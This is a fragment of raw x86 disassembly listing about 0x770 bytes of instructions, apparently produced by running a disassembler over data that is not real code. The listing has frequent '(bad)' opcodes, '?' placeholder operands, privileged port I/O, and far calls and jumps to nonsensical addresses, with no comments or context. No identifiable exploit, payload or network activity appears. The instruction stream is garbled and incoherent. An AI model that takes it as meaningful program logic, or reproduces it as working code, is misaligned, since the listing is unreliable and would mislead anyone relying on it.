  40dda9:	test   BYTE PTR [esi+ebp*1+0x65a6438c],bl
  40ddb0:	xor    BYTE PTR [esi],ah
  40ddb2:	mov    ebx,0x2b084d83
  40ddb7:	jecxz  0x40dd59
  40ddb9:	dec    esp
  40ddba:	or     al,0x86
  40ddbc:	pop    esi
  40ddbd:	mov    edi,0xa1dd6c9
  40ddc2:	jp     0x40de08
  40ddc4:	in     eax,0xaf
  40ddc6:	xchg   ebx,eax
  40ddc7:	cdq    
  40ddc8:	adc    al,0x3d
  40ddca:	repz sub al,0x38
  40ddcd:	adc    eax,0xb295273d
  40ddd2:	lds    ebp,FWORD PTR [edi+0x6426689f]
  40ddd8:	call   0xbfd59457
  40dddd:	iret   
  40ddde:	mov    dh,0x34
  40dde0:	push   esi
  40dde1:	out    0xa1,eax
  40dde3:	xchg   ebp,eax
  40dde4:	pop    ds
  40dde5:	sub    bh,BYTE PTR [eax]
  40dde7:	retf   0xb19e
  40ddea:	clc    
  40ddeb:	add    BYTE PTR [edi+0x6bf26a25],0xbb
  40ddf2:	gs mov edi,0x3a85d56
  40ddf8:	xchg   esi,eax
  40ddf9:	aam    0xdc
  40ddfb:	out    dx,al
  40ddfc:	mov    dh,0x2c
  40ddfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddff:	adc    cl,0xe
  40de02:	sub    ch,BYTE PTR ds:0x5231372b
  40de08:	div    BYTE PTR [ecx+eiz*8-0x45]
  40de0c:	fisubr DWORD PTR [esp+eax*2-0x34]
  40de10:	in     al,dx
  40de11:	sub    eax,0xb9a75f98
  40de16:	cmp    BYTE PTR ds:0xaa165652,ah
  40de1c:	lahf   
  40de1d:	rol    BYTE PTR [esp+ebp*4+0x6f],1
  40de21:	sub    DWORD PTR [esi-0x77],eax
  40de24:	jns    0x40de46
  40de26:	xchg   edx,eax
  40de27:	(bad)  
  40de28:	leave  
  40de29:	xchg   esp,eax
  40de2a:	jecxz  0x40de33
  40de2c:	test   DWORD PTR [eax+ebp*2+0xd],edi
  40de30:	mov    ebp,0xa168a330
  40de35:	mov    ecx,0xd7f506aa
  40de3a:	xchg   edi,eax
  40de3b:	push   ss
  40de3c:	xor    esi,0x21
  40de3f:	dec    eax
  40de40:	idiv   dl
  40de42:	(bad)  
  40de43:	enter  0x32,0xbe
  40de47:	mov    eax,ds:0x4a8633c1
  40de4c:	mov    eax,ds:0xe64b0fc7
  40de51:	test   al,0xc4
  40de53:	xor    BYTE PTR [edi+0x7d990791],ch
  40de59:	out    dx,al
  40de5a:	das    
  40de5b:	fnsave [eax-0x16240925]
  40de61:	push   0x4d
  40de63:	or     BYTE PTR [ebx-0xf606378],al
  40de69:	push   ebp
  40de6a:	sub    eax,0x37d85207
  40de6f:	cld    
  40de70:	lahf   
  40de71:	push   ecx
  40de72:	shl    ah,0x97
  40de75:	xchg   DWORD PTR [edi],esi
  40de77:	sub    ebx,edx
  40de79:	out    dx,eax
  40de7a:	xor    eax,0x882f7d99
  40de7f:	bound  esp,QWORD PTR [esi*2+0x7ec1ac63]
  40de86:	push   0xde864661
  40de8b:	mov    WORD PTR [edi+0x1],?
  40de8e:	pusha  
  40de8f:	out    0x52,al
  40de91:	rol    DWORD PTR [edx],0x64
  40de94:	jmp    0x40de5e
  40de96:	cdq    
  40de97:	out    dx,eax
  40de98:	jne    0x40de98
  40de9a:	ja     0x40de29
  40de9c:	sbb    esi,esp
  40de9e:	jl     0x40de3d
  40dea0:	or     edx,DWORD PTR [edx-0x18c077b]
  40dea6:	and    dl,ch
  40dea8:	rcr    BYTE PTR [eax+0x38cd8350],0x7e
  40deaf:	repz je 0x40de3c
  40deb2:	loop   0x40df1f
  40deb4:	sahf   
  40deb5:	add    al,0x6c
  40deb7:	loope  0x40de52
  40deb9:	fistp  QWORD PTR [esi-0x34460b63]
  40debf:	pushf  
  40dec0:	ds or  al,0xf1
  40dec3:	mov    ebp,0xc11e7f1a
  40dec8:	jl     0x40de7f
  40deca:	fisubr WORD PTR [ebx+0x7ec1e12]
  40ded0:	into   
  40ded1:	push   edi
  40ded2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ded3:	jp     0x40df07
  40ded5:	or     ch,BYTE PTR [edx+0x69c0a07]
  40dedb:	hlt    
  40dedc:	mov    edi,0x25cf2f76
  40dee1:	scas   al,BYTE PTR es:[edi]
  40dee2:	inc    edx
  40dee3:	mov    esp,0xb75496ae
  40dee8:	daa    
  40dee9:	and    edi,DWORD PTR [edx*8-0x32eb2477]
  40def0:	dec    esp
  40def1:	or     BYTE PTR [esi+0x5d],dh
  40def4:	ret    
  40def5:	add    al,0x67
  40def7:	out    dx,al
  40def8:	push   ecx
  40def9:	lods   eax,DWORD PTR ds:[esi]
  40defa:	repnz cld 
  40defc:	xor    dh,cl
  40defe:	in     al,dx
  40deff:	jle    0x40de8a
  40df01:	idiv   BYTE PTR ds:0x179acd77
  40df07:	rcl    DWORD PTR [edx+0x7392feef],1
  40df0d:	and    al,cl
  40df0f:	sub    al,0xdd
  40df11:	and    ebx,esp
  40df13:	fmul   QWORD PTR [esi]
  40df15:	and    edi,ebp
  40df17:	les    edx,FWORD PTR [ebx+0x62]
  40df1a:	repnz sbb bh,BYTE PTR [ebx-0x13]
  40df1e:	pusha  
  40df1f:	fld    st(3)
  40df21:	fs cli 
  40df23:	(bad)  
  40df24:	dec    esi
  40df25:	inc    esp
  40df26:	xor    esi,DWORD PTR [ecx]
  40df28:	retf   0x450c
  40df2b:	pushf  
  40df2c:	cmp    al,0x1e
  40df2e:	in     eax,dx
  40df2f:	xchg   edx,eax
  40df30:	mov    al,0xf1
  40df32:	loopne 0x40df55
  40df34:	dec    ecx
  40df35:	jb     0x40df14
  40df37:	push   0x79
  40df39:	fsubr  st(3),st
  40df3b:	xchg   esi,eax
  40df3c:	sbb    dh,BYTE PTR [ebx-0x7a]
  40df3f:	nop
  40df40:	test   al,0x8a
  40df42:	retf   
  40df43:	sub    dh,BYTE PTR [ecx+0x6]
  40df46:	out    0xa8,eax
  40df48:	lods   eax,DWORD PTR ds:[esi]
  40df49:	mov    fs,WORD PTR [esi+edx*2-0x1f]
  40df4d:	mov    edx,0x3a8690b7
  40df52:	or     bl,dl
  40df54:	aad    0xde
  40df56:	and    edi,DWORD PTR ds:0x1abc0ac9
  40df5c:	jbe    0x40dfb3
  40df5e:	sbb    al,BYTE PTR [esi]
  40df60:	or     ecx,eax
  40df62:	adc    ch,ch
  40df64:	ror    eax,0x17
  40df67:	inc    esi
  40df68:	mov    cl,0x6a
  40df6a:	cmp    eax,0xffffff82
  40df6d:	(bad)  
  40df6e:	mov    ecx,0x6cabfcb1
  40df73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df74:	pop    esi
  40df75:	jo     0x40dfc3
  40df77:	pop    es
  40df78:	in     eax,0x9f
  40df7a:	ins    DWORD PTR es:[edi],dx
  40df7b:	(bad)  
  40df7c:	(bad)  
  40df7d:	or     DWORD PTR [eax],0xffffffdf
  40df80:	xor    al,0x23
  40df82:	daa    
  40df83:	popa   
  40df84:	popf   
  40df85:	fidiv  WORD PTR [esp+ecx*2+0x46]
  40df89:	xchg   BYTE PTR [ecx+0x38],cl
  40df8c:	rcr    BYTE PTR [ecx+0x40],cl
  40df8f:	out    dx,al
  40df90:	leave  
  40df91:	outs   dx,DWORD PTR ds:[esi]
  40df92:	fwait
  40df93:	mov    edi,0xed1d5acb
  40df98:	push   edx
  40df99:	dec    eax
  40df9a:	mov    dl,0x87
  40df9c:	mov    bl,0x28
  40df9e:	imul   esp,DWORD PTR [esp+edi*4+0x2752dd4d],0xa47eb3f8
  40dfa9:	sub    ebx,ecx
  40dfab:	popa   
  40dfac:	leave  
  40dfad:	std    
  40dfae:	dec    ebx
  40dfaf:	cmp    esp,DWORD PTR [eax]
  40dfb1:	ret    0xf1ba
  40dfb4:	lods   al,BYTE PTR ds:[esi]
  40dfb5:	jae    0x40e033
  40dfb7:	cmp    al,0xf2
  40dfb9:	cmc    
  40dfba:	fld    TBYTE PTR [ecx+0x7a]
  40dfbd:	push   esi
  40dfbe:	int3   
  40dfbf:	pop    ds
  40dfc0:	fadd   st(2),st
  40dfc2:	push   esp
  40dfc3:	xor    eax,0xfc2a36b4
  40dfc8:	and    cl,BYTE PTR [eax+0x32]
  40dfcb:	popa   
  40dfcc:	out    dx,eax
  40dfcd:	sbb    ebp,DWORD PTR ss:[esi+edx*2]
  40dfd1:	push   es
  40dfd2:	push   ss
  40dfd3:	bound  eax,QWORD PTR [edx+0x5e]
  40dfd6:	xchg   DWORD PTR [ebp+0x51ce7241],ebx
  40dfdc:	aam    0xbe
  40dfde:	or     DWORD PTR [ecx-0x69ec59e6],ecx
  40dfe4:	adc    bh,BYTE PTR [ebp+0x6d3c941e]
  40dfea:	or     BYTE PTR [esp+eiz*8+0x68eb5bae],0xf8
  40dff2:	jmp    0x40e050
  40dff4:	mov    ss,WORD PTR [ebx]
  40dff6:	scas   eax,DWORD PTR es:[edi]
  40dff7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dff8:	mov    ds:0xedae9685,eax
  40dffd:	sub    ebp,DWORD PTR [ecx]
  40dfff:	repz gs scas al,BYTE PTR es:[edi]
  40e002:	(bad)  
  40e003:	fnstcw WORD PTR [eax-0x391b5436]
  40e009:	out    dx,al
  40e00a:	pop    esi
  40e00b:	jns    0x40dfde
  40e00d:	and    DWORD PTR [edx+0x36538ff7],eax
  40e013:	jns    0x40e092
  40e015:	mov    cl,0x3f
  40e017:	mov    es,WORD PTR [eax]
  40e019:	leave  
  40e01a:	jmp    0x40e049
  40e01c:	pop    es
  40e01d:	xchg   esp,ebp
  40e01f:	test   BYTE PTR [ebp+0x15],0x79
  40e023:	sar    BYTE PTR [edx+0x387988b2],cl
  40e029:	mov    esp,0xef9d0870
  40e02e:	jle    0x40dff8
  40e030:	pop    esp
  40e031:	push   ds
  40e032:	xchg   ecx,eax
  40e033:	in     al,dx
  40e034:	ins    DWORD PTR es:[edi],dx
  40e035:	leave  
  40e036:	push   esi
  40e037:	jne    0x40e055
  40e039:	push   0xc3248bba
  40e03e:	jle    0x40dfce
  40e040:	cli    
  40e041:	ror    DWORD PTR [esi+0x38],1
  40e044:	push   eax
  40e045:	dec    ecx
  40e046:	sub    DWORD PTR [edi],eax
  40e048:	rcl    ebp,1
  40e04a:	xchg   ecx,eax
  40e04b:	call   0xc68b:0x5061d44f
  40e052:	dec    ecx
  40e053:	test   eax,0x9d79985d
  40e058:	retf   
  40e059:	mov    BYTE PTR [edx-0x4bd64e75],al
  40e05f:	dec    edi
  40e060:	sahf   
  40e061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e062:	pop    esi
  40e063:	sub    eax,0x205e957f
  40e068:	popf   
  40e069:	dec    ebx
  40e06a:	out    dx,eax
  40e06b:	loope  0x40e0a0
  40e06d:	jbe    0x40e09d
  40e06f:	add    edx,0xffffffb6
  40e072:	sub    al,0xb7
  40e074:	aaa    
  40e075:	ds (bad) 
  40e077:	sbb    DWORD PTR [edx-0x3f743fd4],esp
  40e07d:	int3   
  40e07e:	prefetch BYTE PTR [esi]
  40e081:	ret    
  40e082:	mov    ds:0x3678e4bd,al
  40e087:	fisttp DWORD PTR [ecx+0x4c1316e4]
  40e08d:	mov    al,BYTE PTR [ebx+0x3db94861]
  40e093:	and    DWORD PTR [ebp+esi*2-0x68e6dc84],edx
  40e09a:	push   edx
  40e09b:	xchg   al,dh
  40e09d:	dec    edi
  40e09e:	jns    0x40e0f9
  40e0a0:	or     al,0xd1
  40e0a2:	add    ebp,DWORD PTR [ebp-0x19ecb7d4]
  40e0a8:	sbb    DWORD PTR [esi],edi
  40e0aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0ab:	add    al,0x68
  40e0ad:	inc    esi
  40e0ae:	dec    ebx
  40e0af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0b0:	xchg   esp,eax
  40e0b1:	or     al,0x4a
  40e0b3:	ins    DWORD PTR es:[edi],dx
  40e0b4:	stos   DWORD PTR es:[edi],eax
  40e0b5:	sub    al,0xd0
  40e0b7:	mov    edx,0xb0451d9f
  40e0bc:	sbb    al,0xed
  40e0be:	push   0x41
  40e0c0:	inc    ebx
  40e0c1:	push   esp
  40e0c2:	fstp   DWORD PTR [edx+0x79]
  40e0c5:	jb     0x40e0d6
  40e0c7:	add    esi,0xb20ba7c7
  40e0cd:	jb     0x40e078
  40e0cf:	adc    BYTE PTR [ebp+0x723f67c8],bl
  40e0d5:	jns    0x40e074
  40e0d7:	fidiv  WORD PTR [ecx-0x70]
  40e0da:	pushf  
  40e0db:	jnp    0x40e101
  40e0dd:	fdiv   DWORD PTR [esi+ebp*8]
  40e0e0:	inc    ebx
  40e0e1:	mov    al,0x61
  40e0e3:	fsub   QWORD PTR ds:0x444a5929
  40e0e9:	sub    bh,bl
  40e0eb:	retf   0x2fc5
  40e0ee:	xchg   edi,eax
  40e0ef:	push   eax
  40e0f0:	mov    al,0x44
  40e0f2:	call   0xad515ca1
  40e0f7:	jmp    0xd98d:0xe600594
  40e0fe:	xchg   DWORD PTR [eax-0x2e],eax
  40e101:	sub    eax,0x830aa074
  40e106:	dec    ebx
  40e107:	jl     0x40e0bf
  40e109:	sbb    ebp,DWORD PTR [edx+0x2d]
  40e10c:	outs   dx,BYTE PTR ds:[esi]
  40e10d:	rcr    DWORD PTR [edi+0x3a19b6ac],0x79
  40e114:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e115:	adc    edi,DWORD PTR [edi]
  40e117:	sar    DWORD PTR [esi-0x1e],1
  40e11a:	loopne 0x40e0c0
  40e11c:	or     al,0xbc
  40e11e:	mov    bl,0xa9
  40e120:	dec    ebp
  40e121:	push   edx
  40e122:	xchg   ecx,eax
  40e123:	popa   
  40e124:	daa    
  40e125:	stc    
  40e126:	(bad)  
  40e127:	cdq    
  40e128:	xchg   edx,eax
  40e129:	xchg   edx,eax
  40e12a:	cmp    ebx,esp
  40e12c:	test   edx,ebx
  40e12e:	mov    edi,0xc8a2327c
  40e133:	mov    BYTE PTR [edi+0x4c81b585],dh
  40e139:	mov    bl,0x44
  40e13b:	xor    esp,DWORD PTR [ebp+0x6fd6a963]
  40e141:	outs   dx,DWORD PTR ds:[esi]
  40e142:	xor    DWORD PTR [eax+ebx*2],ebx
  40e145:	mov    ch,0xa3
  40e147:	dec    eax
  40e148:	fdiv   QWORD PTR [edi]
  40e14a:	das    
  40e14b:	mov    DWORD PTR [ebx-0x3f4490e3],esp
  40e151:	ss into 
  40e153:	and    eax,0x5e7364f7
  40e158:	lods   eax,DWORD PTR ds:[esi]
  40e159:	jb     0x40e181
  40e15b:	(bad)  
  40e15c:	lock out dx,eax
  40e15e:	adc    DWORD PTR [ecx-0x12],esp
  40e161:	mov    ecx,0xacec424e
  40e166:	jmp    0xd903:0xbc6911ba
  40e16d:	adc    al,BYTE PTR [ebp+0x2f]
  40e170:	or     DWORD PTR [edx+0x4f],edx
  40e173:	adc    al,0xc1
  40e175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e176:	sti    
  40e177:	jnp    0x40e143
  40e179:	jb     0x40e1f0
  40e17b:	mov    esi,0xe8fe8568
  40e180:	pop    esp
  40e181:	sahf   
  40e182:	mov    eax,0x36678a50
  40e187:	lea    ebp,[esi]
  40e189:	inc    edi
  40e18a:	and    DWORD PTR [esi+0x6da665f6],esp
  40e190:	lahf   
  40e191:	jle    0x40e14d
  40e193:	xchg   ebp,eax
  40e194:	push   esi
  40e195:	sti    
  40e196:	xchg   edx,eax
  40e197:	mov    al,ds:0xdde6c3b6
  40e19c:	xchg   edi,eax
  40e19d:	adc    edi,DWORD PTR ds:0xe477ccee
  40e1a3:	shl    ch,1
  40e1a5:	lock ins DWORD PTR es:[edi],dx
  40e1a7:	add    al,0xb8
  40e1a9:	sub    ah,BYTE PTR [edi]
  40e1ab:	add    DWORD PTR [esi],ebp
  40e1ad:	dec    esi
  40e1ae:	sub    cl,BYTE PTR [ebx-0x3b]
  40e1b1:	es push eax
  40e1b3:	repz adc eax,0x6f0e613b
  40e1b9:	(bad)  
  40e1ba:	cld    
  40e1bb:	pushf  
  40e1bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1bd:	iret   
  40e1be:	cli    
  40e1bf:	stos   BYTE PTR es:[edi],al
  40e1c0:	and    ebp,ecx
  40e1c2:	inc    edi
  40e1c3:	test   cl,bl
  40e1c5:	dec    ebp
  40e1c6:	fisubr DWORD PTR [ebx+0x7f]
  40e1c9:	int    0xe
  40e1cb:	loop   0x40e17c
  40e1cd:	call   0xe83a:0xa95ddbf9
  40e1d4:	mov    eax,?
  40e1d6:	dec    ebx
  40e1d7:	cmp    al,BYTE PTR [edx-0x48f97958]
  40e1dd:	push   eax
  40e1de:	inc    ecx
  40e1df:	cmp    eax,0xef991077
  40e1e4:	lods   eax,DWORD PTR ds:[esi]
  40e1e5:	aad    0xa2
  40e1e7:	je     0x40e1e3
  40e1e9:	adc    al,0xa1
  40e1eb:	mov    edx,0xb90235f9
  40e1f0:	sub    eax,0x16e30f39
  40e1f5:	push   ds
  40e1f6:	(bad)  
  40e1f7:	sbb    ebx,DWORD PTR [ecx+ebp*4+0x41b0fa63]
  40e1fe:	fistp  DWORD PTR [ebx+0x53ba7bdd]
  40e204:	imul   ecx,DWORD PTR [edx],0xffffffe8
  40e207:	enter  0x458a,0x4c
  40e20b:	repz int 0x70
  40e20e:	sub    BYTE PTR [ecx+0x3f],al
  40e211:	lds    esi,FWORD PTR [ebx+0x68]
  40e214:	xor    cl,BYTE PTR [ebx+0x2e]
  40e217:	dec    ecx
  40e218:	idiv   BYTE PTR [ecx+0x4b]
  40e21b:	add    al,0x6e
  40e21d:	or     bh,BYTE PTR [ecx]
  40e21f:	mov    bh,BYTE PTR [ecx-0x60]
  40e222:	bound  edi,QWORD PTR [esp+ecx*4+0x521f9e4b]
  40e229:	jmp    0x7467:0xb8ad618e
  40e230:	sub    BYTE PTR [esi-0x6],dl
  40e233:	ja     0x40e1e7
  40e235:	sub    DWORD PTR [edi+0x737dbf0e],esp
  40e23b:	out    dx,eax
  40e23c:	push   ecx
  40e23d:	repz add eax,ebp
  40e240:	pop    esp
  40e241:	dec    esi
  40e242:	ins    DWORD PTR es:[edi],dx
  40e243:	mov    bh,0x88
  40e245:	imul   ebp,esi,0x9f68e76b
  40e24b:	jno    0x40e242
  40e24d:	imul   esp,DWORD PTR [esi],0xde2b1f94
  40e253:	sar    BYTE PTR [ebx],cl
  40e255:	(bad)  
  40e256:	sbb    eax,0xd5783172
  40e25b:	fwait
  40e25c:	sub    al,0xbe
  40e25f:	push   es
  40e260:	ror    BYTE PTR [ebp+0x38d943db],0xc4
  40e267:	push   0x30be9f93
  40e26c:	or     al,0x96
  40e26e:	dec    edi
  40e26f:	test   eax,0xe6017750
  40e274:	stos   DWORD PTR es:[edi],eax
  40e275:	aam    0x6b
  40e277:	mov    edi,0x7b4b6a72
  40e27c:	cs push edi
  40e27e:	(bad)  
  40e27f:	mov    edx,0x7aa92159
  40e284:	jae    0x40e2e2
  40e286:	sub    edx,DWORD PTR [edi-0x5c]
  40e289:	data16 mov al,0xc2
  40e28c:	pop    ebx
  40e28d:	loopne 0x40e265
  40e28f:	xlat   BYTE PTR ds:[ebx]
  40e290:	test   eax,0x67ceff67
  40e295:	sbb    al,0x26
  40e297:	mov    al,0x6d
  40e299:	in     al,dx
  40e29a:	jecxz  0x40e276
  40e29c:	pop    ebp
  40e29d:	inc    ebp
  40e29e:	popa   
  40e29f:	sbb    bl,bh
  40e2a1:	xor    edi,DWORD PTR [ecx]
  40e2a3:	pop    es
  40e2a4:	out    0x96,eax
  40e2a6:	jno    0x40e2d3
  40e2a8:	fisub  WORD PTR [edi-0x57f71f8]
  40e2ae:	lock xchg edx,eax
  40e2b0:	(bad)  
  40e2b1:	mov    WORD PTR [edx-0x4049b616],?
  40e2b7:	test   al,0x5f
  40e2b9:	popf   
  40e2ba:	or     bl,ch
  40e2bc:	retf   
  40e2bd:	sahf   
  40e2be:	push   es
  40e2bf:	dec    edi
  40e2c0:	(bad)  
  40e2c1:	outs   dx,DWORD PTR ds:[esi]
  40e2c2:	mov    esp,0x24f1b876
  40e2c7:	inc    ebp
  40e2c8:	dec    ebx
  40e2c9:	pop    edx
  40e2ca:	bswap  edi
  40e2cc:	mov    dh,0x2d
  40e2ce:	push   edi
  40e2cf:	adc    dh,ah
  40e2d1:	sbb    DWORD PTR [edx+0xc],eax
  40e2d4:	sti    
  40e2d5:	jmp    0xb0be:0xb7bd37bf
  40e2dc:	mov    BYTE PTR [edi-0x62],0xf6
  40e2e0:	clc    
  40e2e1:	push   ss
  40e2e2:	inc    edx
  40e2e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2e4:	mov    ch,BYTE PTR [eax-0x1b]
  40e2e7:	ins    BYTE PTR es:[edi],dx
  40e2e8:	sbb    eax,DWORD PTR [eax+0x1e2931b2]
  40e2ee:	stc    
  40e2ef:	mov    al,0x94
  40e2f1:	stos   BYTE PTR es:[edi],al
  40e2f2:	pop    eax
  40e2f3:	es xchg ebp,eax
  40e2f5:	test   dh,dh
  40e2f7:	ret    
  40e2f8:	cmp    ecx,DWORD PTR [ecx-0x63044b8]
  40e2fe:	cwde   
  40e2ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e300:	arpl   cx,cx
  40e302:	out    dx,al
  40e303:	lods   eax,DWORD PTR ds:[esi]
  40e304:	lods   eax,DWORD PTR ds:[esi]
  40e305:	shl    ecx,0x16
  40e308:	xor    eax,0xb41558c
  40e30d:	(bad)  
  40e30e:	pop    ds
  40e30f:	iret   
  40e310:	xor    BYTE PTR [ecx+edx*8-0x45881849],ch
  40e317:	cmp    ecx,ebx
  40e319:	fnsave [ebp-0x60fcb20]
  40e31f:	xchg   edi,esp
  40e321:	popf   
  40e322:	push   0xffffff97
  40e324:	xor    dh,al
  40e326:	aas    
  40e327:	ret    0x764f
  40e32a:	mov    ds:0xfaa401c1,eax
  40e32f:	jno    0x40e322
  40e331:	pop    ecx
  40e332:	popf   
  40e333:	imul   ecx,eax,0x20
  40e336:	cs inc eax
  40e338:	cmp    DWORD PTR [edi-0x6f44b5e7],edx
  40e33e:	mov    ebx,0x5f09e7e
  40e343:	add    al,0x71
  40e345:	jnp    0x40e365
  40e347:	(bad)  
  40e348:	int    0x2e
  40e34a:	ret    
  40e34b:	mov    dh,0x36
  40e34d:	pop    ebp
  40e34e:	mov    ds:0xc6f8bfee,al
  40e353:	jmp    0x40e393
  40e355:	jo     0x40e3a2
  40e357:	add    esp,DWORD PTR [edi-0x498460b9]
  40e35d:	mov    esi,0xc1564eaa
  40e362:	repnz xchg ebp,eax
  40e364:	lods   eax,DWORD PTR ds:[esi]
  40e365:	sub    bh,cl
  40e367:	sbb    eax,0x66e7c1d7
  40e36c:	push   edx
  40e36d:	mov    edi,0x33a4bafe
  40e372:	pop    ecx
  40e373:	or     DWORD PTR [eax],edi
  40e375:	and    eax,0xc8c281df
  40e37a:	dec    esi
  40e37b:	addr16 cdq 
  40e37d:	jmp    0x58ba88da
  40e382:	pop    es
  40e383:	out    dx,eax
  40e384:	or     DWORD PTR [edx],edx
  40e386:	out    0x41,al
  40e388:	pop    ebp
  40e389:	jb     0x40e30e
  40e38b:	adc    eax,0x318fb930
  40e390:	fsub   st,st(3)
  40e392:	je     0x40e380
  40e394:	pop    ecx
  40e395:	stos   DWORD PTR es:[edi],eax
  40e396:	add    al,0x78
  40e398:	int3   
  40e399:	mov    dl,0x3a
  40e39b:	in     al,dx
  40e39c:	pop    ebx
  40e39d:	push   esi
  40e39e:	jb     0x40e419
  40e3a0:	imul   esi,DWORD PTR [ebp+0x521ad5d1],0x8f17ad60
  40e3aa:	fs push eax
  40e3ac:	mov    ebp,0x80317bda
  40e3b1:	jo     0x40e34f
  40e3b3:	repz in eax,0x4f
  40e3b6:	enter  0xbbd5,0x5d
  40e3ba:	mov    cl,0xe7
  40e3bc:	sahf   
  40e3bd:	gs add cl,0xc3
  40e3c1:	popa   
  40e3c2:	pop    edi
  40e3c3:	mov    edi,0x872b7906
  40e3c8:	rcl    BYTE PTR [edx],1
  40e3ca:	push   cs
  40e3cb:	aas    
  40e3cc:	dec    esi
  40e3cd:	pushf  
  40e3ce:	push   ebx
  40e3cf:	mov    dl,0x12
  40e3d1:	pop    es
  40e3d2:	sub    BYTE PTR [edi],cl
  40e3d4:	sbb    BYTE PTR [esi-0x37],bl
  40e3d7:	lods   al,BYTE PTR ds:[esi]
  40e3d8:	jbe    0x40e3e5
  40e3da:	ins    BYTE PTR es:[edi],dx
  40e3db:	adc    ecx,edi
  40e3dd:	sub    dl,bl
  40e3df:	mov    ds:0x48181415,al
  40e3e4:	frstor [eax+0x68]
  40e3e7:	cwde   
  40e3e8:	in     eax,dx
  40e3e9:	mov    dl,0xcd
  40e3eb:	std    
  40e3ec:	sbb    eax,0xe1c70c3a
  40e3f1:	sbb    DWORD PTR [eax-0x566f9086],0x471da097
  40e3fb:	mov    ebp,0x9eea0c62
  40e400:	stc    
  40e401:	retf   0xea68
  40e404:	adc    BYTE PTR [eax+eiz*1-0x79620c16],ch
  40e40b:	aam    0x78
  40e40d:	mov    esi,0xd0eccd19
  40e412:	call   0x3e:0xd8b25fb9
  40e419:	sub    eax,0x2dd028d2
  40e41e:	cmp    dh,BYTE PTR [ebp-0x54]
  40e421:	test   al,0x72
  40e423:	add    eax,0xbfd4e49e
  40e428:	imul   DWORD PTR [edi+ecx*1-0x64f7c0e4]
  40e42f:	pop    edi
  40e430:	scas   eax,DWORD PTR es:[edi]
  40e431:	push   ds
  40e432:	pushf  
  40e433:	ins    BYTE PTR es:[edi],dx
  40e434:	cmp    eax,ebx
  40e436:	call   0xc50a2612
  40e43b:	jnp    0x40e4aa
  40e43d:	jl     0x40e3f7
  40e43f:	jb     0x40e435
  40e441:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e442:	xor    eax,0xbfbec580
  40e447:	mov    ecx,es
  40e449:	cmc    
  40e44a:	cmp    ecx,DWORD PTR [edi]
  40e44c:	xor    esi,ecx
  40e44e:	repnz push esi
  40e450:	cdq    
  40e451:	bound  edx,QWORD PTR [edx]
  40e453:	mov    esp,0x776e3929
  40e458:	stos   BYTE PTR es:[edi],al
  40e459:	xor    eax,0xbaed981c
  40e45e:	mov    al,0xd5
  40e460:	scas   al,BYTE PTR es:[edi]
  40e461:	push   esi
  40e462:	mov    ah,0xba
  40e464:	cmp    ah,dh
  40e466:	jo     0x40e41f
  40e468:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e469:	push   esp
  40e46a:	imul   DWORD PTR [eax-0x48f6b7ba]
  40e470:	push   cs
  40e471:	xchg   edi,eax
  40e473:	(bad)  
  40e474:	xor    al,0x63
  40e476:	xchg   DWORD PTR [edi],edi
  40e478:	outs   dx,BYTE PTR ds:[esi]
  40e479:	std    
  40e47a:	xor    cl,BYTE PTR [ebp-0x22e0b005]
  40e480:	cld    
  40e481:	into   
  40e482:	stos   BYTE PTR es:[edi],al
  40e483:	xchg   edx,eax
  40e484:	call   0x938:0x60c51b05
  40e48b:	inc    edx
  40e48c:	jne    0x40e41c
  40e48e:	mov    ah,0xff
  40e490:	sub    BYTE PTR [ebp+eax*4+0x2331c881],bh
  40e497:	push   ds
  40e498:	out    0x2f,al
  40e49a:	gs in  eax,dx
  40e49c:	pop    ds
  40e49d:	xchg   ebx,eax
  40e49e:	push   ebp
  40e49f:	call   0xb7eeb951
  40e4a4:	jecxz  0x40e4ce
  40e4a6:	je     0x40e4a8
  40e4a8:	mov    bl,0x2c
  40e4aa:	aas    
  40e4ab:	ins    DWORD PTR es:[edi],dx
  40e4ac:	mov    edi,0x3225acbd
  40e4b1:	push   es
  40e4b2:	xchg   ebp,eax
  40e4b3:	into   
  40e4b4:	retf   
  40e4b5:	pop    esi
  40e4b6:	dec    ecx
  40e4b7:	fcomp  QWORD PTR [ebx+0x5512d792]
  40e4bd:	loop   0x40e463
  40e4bf:	inc    esp
  40e4c0:	leave  
  40e4c1:	int    0x42
  40e4c3:	mov    ?,WORD PTR [ecx]
  40e4c5:	outs   dx,BYTE PTR ds:[esi]
  40e4c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4c7:	jo     0x40e44e
  40e4c9:	loope  0x40e4cb
  40e4cb:	call   0x337d:0x6dcb985
  40e4d2:	xor    BYTE PTR [ebx],al
  40e4d4:	int    0xfb
  40e4d6:	stos   BYTE PTR es:[edi],al
  40e4d7:	sub    eax,0x2c638655
  40e4dc:	ins    DWORD PTR es:[edi],dx
  40e4dd:	dec    edx
  40e4de:	not    BYTE PTR fs:[ecx]
  40e4e1:	daa    
  40e4e2:	push   cs
  40e4e3:	jp     0x40e49c
  40e4e5:	jne    0x40e4ae
  40e4e7:	repnz test DWORD PTR [esi+0x7932ef9e],edx
  40e4ee:	cld    
  40e4ef:	inc    ebx
  40e4f0:	xchg   esi,eax
  40e4f1:	dec    ecx
  40e4f2:	inc    eax
  40e4f3:	repnz (bad) 
  40e4f5:	cmc    
  40e4f6:	pop    ecx
  40e4f7:	and    DWORD PTR [esp+esi*2],ebx
  40e4fa:	shr    BYTE PTR [edi],0x2d
  40e4fd:	or     eax,0x9761668c
  40e502:	sub    BYTE PTR [ebx],0x84
  40e505:	dec    eax
  40e506:	fld    QWORD PTR [ebx+0x6c66fd9b]
  40e50c:	sub    bh,BYTE PTR [ebp+ebp*8-0x5f333c05]
  40e513:	pop    esp
